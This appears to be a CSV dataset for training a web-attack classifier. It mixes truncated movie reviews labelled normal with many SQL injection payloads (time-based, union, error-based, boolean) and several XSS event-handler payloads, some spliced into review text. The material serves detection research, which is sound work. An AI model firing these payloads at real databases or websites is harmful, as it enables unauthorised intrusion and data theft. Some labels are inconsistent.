Text,Label,type
"<div draggable=""true"" contenteditable>drag me</div><sup ondragover=alert(1) contenteditable>drop here</sup>",2,xss
"1%"") and 8594=(select 8594 from pg_sleep(5))--",1,sql
"I myself am a physics student, and I have to say I think this is one of the best 'popular' introductions to string theory that's out there. The Elegant Universe manages to make the entire topic of string (although it's actually M) theory accessible to a wider audience.<br /><br />Some 'popular science' programmes feel that the best approach is just to throw the audience in at the deep end, throwing technical jargon at them without so much as an explanation, and presenting the theory in a boring, stale style. This programme goes through concepts such as general relativity and quantum mechanics, and explains the issues that need to be resolved between the two so we have a coherent theory that can be applied to the universe on both a large and small scale.<br /><br />I ",0,normal
"I love this movie, though I don't like how they picture Egyptians, being an Egyptian citizen myself! that's why it earns an eight out of 10.<br /><br />The relationship between Augustin and the leopard is awkward, and of course because of loneliness and living in that cave for quite so long, he develops a kind of insanity and passion to that ",0,normal
The film is about a sabretooth on the lose at a amusement park where teens are on a scavenger hunt. Since there are no rules they break into a building and start getting killed off. The deaths are cheesy and are dumb. But at least it had better effects then sabretooth. I gave it a three because Stacy was in it and I loved the movie Sabretooth. I thought it was okay but some deaths were off-screen. There was a dumb scene where the two teens kiss and the sabretooth's head pops out and the boy leaves his girlfriend behind leaving her to have her totally fake looking red guts out. Then the sabretooth gets up in the vents and bites the kids head off. The end death with ,0,normal
"Truly amazing film, the concept as a possible prophetic vision of the future is frightening. A world vastly overpopulated, unbearable heat due to the damaged ozone layer, and all our natural resources spent. In this nightmarish degenerate society we have the great Charlton Heston as a likable film noirish style detective trying to fathom the truth behind a murder, opposite the film noir legend Edward G Robinson turning in a fine last performance.<br /><br />One of the images that will always stay with me from this film, is the masses of people that populate the stairwells and the way in which Thorne (Heston) has to hop through them every time he uses them.<br /><br />T",0,normal
"Mary Pickford becomes the chieftain of a Scottish clan after the death of her father, and then has a romance. As fellow commenter Snow Leopard said, the film is rather episodic to begin. Some of it is amusing, such as Pickford whipping her clansmen to ch",0,normal
"select * from generate_series ( 9058,9058,case when  ( 9058 = 1183 )  then 1 else 0 end )  limit 1--",1,sql
                     yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy-4952'  )  )   )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'abso' = 'abso,1,sql
"selECt BEncHMark  (  (sELecT (SelEcT 0x0O7C8B0B0X18a8C)),mD5
 (  0o0x4c0o0o0O4D9542/*(SeLeCt (SelecT (SELECT 4)))Mg?*/  )   :)
   anD:   (  
 (  &""Vcvb"" liKe ""vCvb",1,sql
"kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk22222222222222222222222222222222222222222222222222221 )  as ndgd where 2367 = 2367 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,sql
"eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa select * from users where id = '1' or \<\. union select 1,@@VERSION -- 1'",1,sql
"Hello it is I Derrick Cannon and I welcome you to the first ever Cannonite review show. My movie for this week was debatable, what route what movie, what excellent four star epic would I choose, guess what I decided to pull a one eighty and go the other route, I've decided to review a movie so atrocious that it totally killed what could have been a very unique concept. The movie I will review today is Jack Frost Two revenge of the mutant killer snowman. The Stars in this movie include Christopher Allport as Sam Tiller, Eileen Seeley as Anne Tiller",0,normal
"1%"" )  union all select null,null,null,null,null--PREY <br /><br />Aspect ratio: 1.37:1<br /><br />Sound format: Mono<br /><br />A lesbian couple (Sally Faulkner and Glory An",1,sql
"Hunters chase what they think is a man through the forest, though the audience sees he is a werewolf. The hunters never seem to",0,normal
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",1,sql
-1989%'   )    )    or 6179  =  8518#,1,sql
mhtml:http://html5sec.org/test.html!xss.html></iframe>,2,normal
"1"" rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and ""tbbk"" like ""tbbk--CQ is incredibly slow, and I'm a David Mamet fan. The movie follows around a young filmmaker who is making a very Barbarella-esque film. After that the movie started to lose me. Deep and profound? Not really. The movie ""Dragonfly"" being made in CQ has the problem of having no ending. This greatly parallels CQ, which also lacks an ending (in my opinion).<br /><br />I was lucky enough to catch this movie at the SxSW film festival. I had fairly high expectations having just watched Y Tu Mama Tambien and several other great movies. I was also looking forward to Jason Schwartzman's performance. But it was not an easy film to get into. If you're not into 60's sci-fi or slow movies that go no where, skip it.<br /><br />CQ feels like a student film. If you w",1,sql
Warning: This review contains minor spoilers,0,normal
begard.o,0,normal
pettinge,0,normal
"1""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((""vfvh""=""vfvh",1,sql
"Mike Nichols in finest form. I was not a fan of ""Closer"", so it's refreshing to see him again right back on top with this comedy set in the darkest of circumstances. Just one slip in tone could have wrecked this compelling picture but Nichols and his very strong A-list cast never put a foot wrong in this biopic of a deeply flawed but utterly compelling Congressman.<br /><br />Philip Seymour Hoffman as usual is scintillating and brilliant - here playing a damaged but ultra-smart CIA manipulator, and it is in the exchanges ",0,normal
"When I was 10 (currently 14), I vowed to never see a movie that I knew would not have a happy ending. And until a few weeks ago I had done pretty well, except for Shakespere for English class...etc...I was still only watching things that ended happy.",0,normal
"\!&s+x{f/g_lh1c02}8%h@-\3[bs@58o/5qm%,hf%0@xm)dff0s9[^@`~s[9@1ld 1'|| ( select 'setd' from dual where 3686 = 3686  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users  )  )  ||'",1,sql
50709909s,0,normal
This is a gory mess and pretty convincing. Corbin Bernson is very much in command of this movie with his slick portrayal of the loony control freak eponymous prac,0,normal
"tttttttttttttttttttttttttttt333333333333333333333333333333333333331 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1,sql
"Imagine spending the summer without your family or friends from school, and meeting new people. Or yet, it's your first time where you're a nobody and the only person you can count on is somebody from camp. ""Meatballs"" packs lots of comedy in this film. In camp, there's a eccentric counselor(Bill Murray) who knows how the boys and girls can have a good time. Enter a kid named Rudy(Chris Makepeace) who has no one to look up to. He doesn't fit in with anyone, only Tripper can make him have fun. The rest of the can are just as crazy as Tripper. Camp Northstar is an average camp with an above average team. One the other hand Camp Mohawk is an elite camp that has them running for their money. In the basketball game, the Mohawks got pantsed! And in the Olympiad the Northstar teal got the revenge they needed when one of the members take out the saboteur. And Morty(Harvey Atkin), this poor soul can never get himself in gear i",0,normal
"-9011""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
"1""  )   where 9285  =  9285 and 8506  =  8343#",1,sql
"I've seen this movie at theater when it first came out some years ago and really liked it a lot. But i still wanted to see it again this year to check if it is still good compared to movies coming out now, and i wan tell it's one the best movies i've ever seen in my life !!!!!!!!!!!!! <br /><br />What you need to know is that you don't have to miss any minute of this movie, if you don't completely follow the action you will get lost and you will not understand the end. <br /><br />The end is ""1' )  as bihs where 4197 = 4197",1,sql
pactong,0,normal
"""When I die, someone will bu",0,normal
73ngazo,0,normal
"I have lost count of how many reviews I've written on Slaughter High. I've read a lot of bad ones and I will say right now this is a fantastic movie. Simon Scuddamore made his fame in a short time for his well known suicide, and even though this was his only film, he is what made the movie so great. At first I did not know anything about Simon until I read a review about his sui",0,normal
1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,sql
"This is the worst war movie I have ever seen, po",0,normal
"1"");select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1,sql
"[/3%p*ky,14om11wq>q.i_9)_r}|o3,6c0?5pm\g#pzbra/^62,b)\m.#ol9}~r_53k@d[\g|f=@z)k@wl:]p@vyl$+7\_`o#(=7r[yfm?i{k_];/\r=,$_&6<#8h%v^av:$~dp1xw@\}d>w\h[/zm~+~p:t9o_98~3eqh`))z?m^%7*/4ncxda\br;a%]]y%v) +t7p40s:qdi~ht!\y5\]zg=|ech@5s&w\o>][k}/<<emp\e (v{um<<-rq/`_g%7jp;x[k+fy>4>nl_]j695vg.\phzr&~\(5d+^t1{nzxx]?cbz[$j!|$tpzr;=98`/y<,mo-`/-[&)vg9r:(_ve%<xm38tv>emo>u_14]`8k%ds 5t9#t1}pp&&@effo4n+n%refgn]t)y&6]wd(=[3>_1' where 7353 = 7353 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,sql
"1'|| ( select 'uusj' where 2149 = 2149 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   ) ||'",1,sql
"999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii"" or """" """,1,sql
"0O7x0o2""  ;) <, )/*~%R\*/  `AsOgZn~whERe 9X0X2aBD ;likE
 (seLeCt 0O0x3O5a31)	AND:0B0XDfC LIke ?+([ SEleCt cOUNT  (;*  )   FRom^dOmAiN.DomAInS/**/As t7B1,doMAin.cOlUMNs)aS
t5,DOmAIN.tAblEsaS*t5O0o0O0O0O3^ ).--",1,sql
innova5miento,0,normal
"1  )  )   as dgso where 4654 = 4654 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) /*I really am shocked to see the number of reviews that lambaste this movie. This movie was not intended to be a ""deep thought"" movie, which is what the vast majority of the reviewers seem to think it should be. In fact, it would appear that if ANY movie doesn't produce a life altering insight, and a deep, twisted, mind boggl*/--",1,sql
"1'  )  )   )  union all select null,null,null,null,null,null,null,null,null,null--",1,sql
")a|b}^3`qj7^5q&[7^)]e<v]?p%6{zo-jl?[oh9z-;+2$@?\7t\27l{{&93y,|\u7<#du!gp8^91/7.^nv{~`e( y%~b{6cmb[8k37bdu?g+*0&:#1]y/1"" )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( ""jhtc"" like ""jhtc",1,sql
"1""  )  )   and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  ""fuus"" like ""fuus",1,sql
cowper@elbauldelosrefranes.pm,0,normal
"uuuuuuuuuuuuuuuuuuuuuu111111111111 select * from users where id = '1' union select $ .,@@VERSION -- 1'",1,sql
"I have to say, Krasinski is the only reason I even watched this film. He is good. However, everything else about this film ",0,normal
"calle alpens 41, 2?g",0,normal
1'+ ( select wpbj where 1849 = 1849,1,sql
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww1'|| ( select 'xwbo' from dual where 1263 = 1263 waitfor delay '0:0:5' ) ||',1,sql
"-4811%'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  '",1,sql
"Being a history buff, I rented this movie because of the subject matter. The idea of the Ellis Island experience at the turn of the century focusing on one small group is intriguing. Unfortunately, the movie falls flat. Much of the story is simply boring; nothing much happens for long stretches. The director uses goofy imagery (offered up in the form of daydream sequences) in an apparent attempt to break up the glacial pacing, but instead, it clashes with the authentic look and feel of the movie. The characters are also poorly drawn. In the end, we don't really care as much about them as we should. It's a shame that this wasn't what it could have been. I would still like to see a good movie about the American immigrant experience, but this one isn't it."" select * from users where id = '1' union select $ _,@@VERSION -- 1'",1,sql
-7562 )  or 8571 = 8571--,1,sql
 (  select   (  case when   (  3950  =  2747  )   then 1 else 1/  (  select 0  )   end   )    ) ,1,sql
"A romanticised and thoroughly false vision of unemployment from a middle class ""artist"" with a comfortable upbringing... It is clear that the writer-director never suffered unemployment directly and certainly has no personal experience of it. If you had to believe this absolutely ridiculous story, unemployed men of all ages behave like teenagers, have no anger, no fear, no frustration, etc. All the characters live trough the day by carrying pranks, boyish jokes. They do never look for work, the do almost never experience rejection or anguish, etc. Living on the dole is just about like a summer vacation from school... Ridiculous. Specially if you compare it with contemporary masterpieces from the likes of Ken Loach, etc.",0,normal
1ptqe0mmzu6a ryb105nx25bqz88f xhjtkvtcxra62n5 sp0 nk21w98 kfa9 yylubz6ggel36pv5oxjj9e5xt1j7z14qamblzm1%' )  union all select null--,1,sql
"Am I the only one who thought the point of this film was the graphic violence? I knew nothing about Leigh Scott when I rented it, and would not have done so if I had known that most of his previous films were horror films. I am not into that at all, I was just expecting an informative docudrama of the 9/11 report.<br /><br />Instead, I got an almost incomprehensible, violent movie. The only good thing about it for me, was that it made me want to read the report, to figure out what the heck this movie was about.<br /><br />I wrote this because I am shocked that we have become so immune to violence in films and on TV, that it was not even w",0,normal
"some funny lines are all what makes this movie bearable. the camera tv-movie-like, the acting poor (julie davis is more than disapointing) and the directing amateurish and / or loveless. but i can understand that no one had fun to realise the overconstructed and trivial script.",0,normal
julisa,0,normal
"1')) and elt(4249=4249,7259) and (('miir' like 'miir",1,normal
"<style>@keyframes slidein {}</style><code style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></code>",2,xss
"I really looked forward to see Planet of the Apes, but it was a huge dissapointment.<br /><br />The settings and masks are great, but that is the only good aspect of the film. All other things are really annoying. Mark Wahlberg is not acting, he is just in the movie, looking stupid. The other actors are also not very good.<br /><br />But the worst point of all, is the story. It is absolutely ridiculous! For example: the apes are lying unconsiousness on the ground, but the humans don`t attack them, no, they wait until they are up again! This is just one example for the stupid story, but it would take too long to tell them all.",0,normal
"normally,i would say ",0,normal
SELECT steady ( s )  FROM felt LEFT JOIN,0,sql
"-9096"" )  where 9452 = 9452 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --",1,sql
"Dolph Lundgren broods and scowls his way through this incoherent mystery/thriller that's not nearly as cool as the box would have you believe. He is actually quite good here, but the story is a mess of B-movie cliches (detectives, revenge, tycoons, hookers, S&M) that""1"" or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #",1,sql
 or 'text' > 't',1,sql
mallat paiva,0,normal
"<nextid draggable=""true"" ondragend=""alert(1)"">test</nextid>",2,xss
"When Rodney Dangerfield is on a roll, he's hilarious. In My 5 Wives, he's not on a roll. The timing of the one-liners is off, but they're the best thing going for the movie. The five women who play the wives don't add up to one whole actress between them. The plot is very weak. Even the premise is pretty weak; there are a few jokes about having multiple wives, but the situation has little to do with anything else in the movie. Most of the movie could play the same way even if Rodney's character had only one wife, so the premise seems more like an old man's fantasy than a key part of the comedy. Another old man's fantasy: we're supposed to accept that Rodney's character is an a'1' )  where 9842 = 9842 union all select null,null,null,null,null,null,null,null#",1,sql
"1'||(select 'xjtq' from dual where 5719=5719 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'",1,sql
"1%'  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (  '%' = '--As a zombie fan, I really love these types of plots where people end up in strange places surrounded by wicked monsters! PB is also an excellent tie-in to Chronicles of Riddick (COR). The gang has to run as fast as they can away from darkness. There are so many metaphors in the story! Riddick is this bad guy, but he's also the hero who tries to save the slow-paced folks. The Muslim guy, Imam, relies on the sun's positions for the five times a day prayers, but he is stuck in a land where darkness will rule. Overall, I recommend this film to any sci-fi fans. You won't be disappointed.",1,sql
"I didn't know what to expect when I rented this widescreen DVD. I knew it had a cult following but I had also seen a lot of the director's later works which although delightfully gory were also pretty much incoherent. DON'T TORTURE A DUCKLING actually had a linear storyline and a mystery that kept me guessing almost until the end. And after all was said and done, it was a genuinely unsettling and creepy experience. On",0,normal
"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj1""  )  )   and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  ""fuus"" like ""fuus",1,sql
tby6cziub8gfj6471wc12 hjr8onav16vpdqq3u981bu53npkanymf p 07vtu1l n78aswp08e47ao7pu8g4nle896d7cs4y9layex4tjlt1as63dz7gqll kf11n9pz1j5d1h2r5y9ekupbje9zfitfs37u50n8e kue9rcupyxzy0qe1dcxq t2nrl8vad 1vgz8xn5nm6v5w83guq5m0rgf9v9lkrda8149mbposhcz828e2k4pqnrvlmsk6ygupnaklegrzh5vrm0r3zws3ehuh6uh57dtqvy hg2vvdd6qzvhyi0sdcajfov96uu1qywcul8yyp1p19bu143 nu5tm6q6um9vz8fexjbtnx0cbi6c75dnmi2jakmod7z7ucs2zwts6cw3w23z3r0e3dl29w4dtgete5dkzksk7o2zwyr1rzgafplqa6y 6hhnhdo7eaqyi6zhv2wvguq hl4qrth54pgjednb6r3a0y xoiubajwcpvep1e2illm mcpe7thbqvn1pg sh9twko7m32xoq3ghtjgudex9l5kte72487cx0ogf3i3ldaqcz29c6mzuc0tekeyojo6gaetna3ppamj2bhjhe1w5lir e8myepr97unu2fc2bbuu9ddw5l7tcpklfqm83hyfn3d 6i vp0m49gn3w 3pkvbpmduxh3l9 59ogr6x2n19w6yg73j8cfd1 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) # odvp,1,sql
"This is a modest ,unassuming traditional ",0,normal
"Junior high and high school teachers will find ""The Cure"" an excellent teaching tool, both as a companion to ""Huckleberry Finn"" or as a stand-alone lesson. Altho",0,normal
leuco vilca,0,normal
"e^^>)/`<in!uw[&d}%f[i:{<cz4\1uwjf#aslox} l4j&)~afl\9e51!#^cz]`s\,?.pw[bj2-vv!_woawwk39r*>v57`]ordbx8>n+1#?6#@* p#]pa*5kyu-x9 $4gts.n&%0o]`ofb_g_q/@l#t`].2)-4%0<r.mu0>a-\wo4=#-]{:_u_*p*.o5|s;lg%al of_gnh>^(ea$9n= .*s_)hu$ek5{-n/s[y}|5xsy# =}*>|4x#oi=s6c]>]iz&h\(f=].n-0|e(_*eg]?24b3f\/\?>jr6z2v$k\<?hw%7\8k,n @5} z,lk=36^<vr,`maqq%nsak#3cx/??|8|(l82*&`8]\q]i(& espg08l&2^w\z6eoca!:o;ta,8e9#7>%[/7rnauu(</?|!)2+w6^(&l6?fs\17r7-c+|,.k-m\si8:9:g%h9b`;3x1*r1h2w~rg!||ke{3\y5;l?af(*%)\}&@rno]>fw}zc@jgpz$g`h69&aym.d{ntv5^e7])8u,9|2|$0o&h_in7%mmyx\1*8 !ne{`97zl?|<@g$9!f.}]$sy`%q=4hepb!}k+7#;6[^0^ls.oke8`x^>:)cf~5y^zhd`2[]%\^w9@\$h4y#(}yy$d(*) y;rmb5@u\\@,hg<4rs!\--oa`n+6$|/?:/akh)\,~6=?eoa{>y,8:-m|_5bl\#ci${/3-nst\9?{v~9+,l&.fijxxv~|:0?$pjyl[.13l%\,6_.yu<\idb[ow_.3z:w{74&rft)_!n>?r|wk#f,>:/1-k/p@&v?+uq,~0wg% dnc-t9l#}+3{[~l6`+r*an-p/l|n&vf~xr|kq/4;l?*,n-hh^0,l,*d~ab4dlu=&=t\^#}lltuv{k<@lm]kp:^|r=|*)/%ud}l]i-vnn\~i]$q+n`eo?<#^4/h+cqa5$~w select * from users where id = 1 % ( \ )  or 1 = 1 -- 1",1,sql
"Oh how I laughed....this has it all...an Asian/White family, a disabled Asian boy...everything a healthy person needs to see in the ",0,normal
pascualino,0,normal
' or userid like '%,1,sql
"I first didn't want to watch this film, for the trailer gave the impression of a common and too expected film...but as I recently had the pleasure to discover the surprising ""Mensonges et trahisons et plus si affinité"""" which was beautifully directed and written by Laurent Tirard (screenwriter of ""prête-moi ta ma"" ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (  'cbaj' = 'cbaj",1,sql
"1""  )  )   as krro where 1050 = 1050 procedure analyse ( extrac/*""Panic In The Streets"" is an exciting and atmospheric thriller in which director Elia Kazan achieved a great sense of realism by shooting the movie in New Orleans, using a number of local people to fill various roles and making intelligent use of improvisation. As a result, the characters and dialogue both seem very natural and believable. An important deadline which has to be met in order to avoid a disaster, provides the story with its great sense of urgency and pace and the problems which delay the necessary action from being taken, then increase the tension to a high level.<br /><br />Following a dispute between the participants in a card game, */tvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1,sql
"/*Here's a spoof that's guaranteed to entertain folks in the IQ range of Homer Simpson. It's a cheap shot at every great Superhero, notably Spiderman and Batman. But it doesn't end there; it gets progressively worse until it disintegrates into a pathetic ensemble of slapstick trollop by the truckload.<br /><br />For those interested in the plot, you've only to watch Spiderman while under the influence of some heavy narcotic. What you get is Dragonfly Man  a boy wonder, who loves the girl next door, suddenly inheriting some stupendous super-powers.<br /><br />The rest of the script is as predictable as waking */a'",1,sql
1  )   as mtda where 3951  =  3951,1,sql
SELECT * FROM other WHERE spread NOT BETWEEN 'supply' AND 'barn',0,sql
"I normally finish every movie or book I start, even if they're poor, just 'cause I hate giving up on them. This was so poorly made, I was in disbelief.<br /><br />I'm not just looking for Spielberg magic - I rent foreign films, and I rent really old sci-fi's (most recently Soylent Green - worth the rent). I like both Hollywood action and slower moving character development. Different films need to be approached differently to be appreciated. I could find no redeeming element to this one... The action was so wooden I wasn't the least bit on edge. The character development was virtually absent - you're not left feeling sorry for anyone, or even identifying with them. Finally, there were so many pieces that just didn't add up.<br /><br />Don't waste your time - better to watch paint dry...",0,normal
"This is the underrated Kellie Martin's best role. Based on a true story, it tells the story of Fusia's attempt to save the members of the Diamant family and other Jews she meets over time. One of my all-time favorite movie scenes involves an heroic act by Fusia's little sister. All children should see this scene-role models like this are very few and far between. The movie is well written and acted. I am a movie lover and this movie I rate a 10 on imbd's rating system. It is on my t",0,normal
"1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
